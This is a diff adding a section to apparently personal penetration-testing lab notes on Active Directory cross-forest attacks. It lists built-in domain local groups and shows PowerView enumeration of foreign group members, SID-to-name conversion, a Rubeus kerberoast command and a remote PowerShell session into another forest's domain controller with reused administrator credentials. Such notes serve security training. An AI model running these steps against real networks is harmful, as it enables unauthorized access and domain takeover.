@@ -177,5 +177,49 @@ Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity mssqlsvc |select samacco
 .\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap
 ```
 
-```
+## Admin Password Re-Use & Group Membership
+- We may also see users or admins from `Domain A` as members of a group in `Domain B`.
+- Only `Domain Local Groups` allow security principals from outside its forest. and here is all built-in `Domain Local Groups`
+
+| Group Name                        | Description                                                                    |
+|-----------------------------------|--------------------------------------------------------------------------------|
+| Administrators                    | Members have full control over the domain, including all domain controllers.   |
+| Account Operators                 | Members can create, delete, and modify user accounts and groups, except for administrative accounts. |
+| Backup Operators                  | Members can back up and restore files on domain controllers.                   |
+| Print Operators                   | Members can manage printers in the domain.                                     |
+| Server Operators                  | Members can log on to domain controllers and perform server management tasks.  |
+| Incoming Forest Trust Builders    | Members can create incoming forest trusts to the domain.                       |
+| Pre-Windows 2000 Compatible Access| Provides read access to all users and groups in the domain.                    |
+| Guests                            | Limited access group for temporary accounts.                                   |
+| Remote Desktop Users              | Members can remotely log on to domain controllers.                             |
+
+
+
+- We may see a `Domain Admin` or `Enterprise Admin` from Domain A as a member of the `built-in Administrators` (which is Domain Local Group) in Domain B in a bidirectional forest trust relationship.
+- **Case:** `FREIGHTLOGISTICS.LOCAL` and `INLANEFREIGHT.LOCAL` have bidirectional trust and we are in domain `INLANEFREIGHT.LOCAL` with comprmised `Domain admin` user and password reuse for another user in cross-forest
+
+
+
+```powershell
+# enumerate groups with users that do not belong to the domain
+Get-DomainForeignGroupMember -Domain FREIGHTLOGISTICS.LOCAL
+=>
+GroupDomain             : FREIGHTLOGISTICS.LOCAL
+GroupName               : Administrators
+GroupDistinguishedName  : CN=Administrators,CN=Builtin,DC=FREIGHTLOGISTICS,DC=LOCAL
+MemberDomain            : FREIGHTLOGISTICS.LOCAL
+MemberName              : S-1-5-21-3842939050-3880317879-2865463114-500
+MemberDistinguishedName : CN=S-1-5-21-3842939050-3880317879-2865463114-500,CN=ForeignSecurityPrincipals,DC=FREIGHTLOGIS
+                          TICS,DC=LOCAL
+
+
+# get security princible name
+Convert-SidToName S-1-5-21-3842939050-3880317879-2865463114-500
+=> INLANEFREIGHT\administrator
+
+
+
+# auth to FREIGHTLOGISTICS.LOCAL using administrator cred 
+Enter-PSSession -ComputerName ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -Credential INLANEFREIGHT\administrator
+
 ```
